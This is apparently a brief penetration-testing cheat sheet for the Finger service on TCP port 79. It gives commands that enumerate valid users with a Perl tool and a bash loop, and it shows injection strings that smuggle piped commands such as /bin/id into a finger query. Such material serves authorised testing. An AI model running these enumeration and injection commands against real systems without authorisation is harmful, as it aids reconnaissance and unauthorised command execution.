# Finger - TCP 79

### Enumerate users with Perl script

```
# https://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz

./finger-user-enum.pl -U users.txt -t <target ip>
```

### Enumerate users with Bash one-liner

```
for username in $(cat usernames.txt); do finger $username@<target ip>; done > valid_users.txt
```

### Check for command execution

```
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```
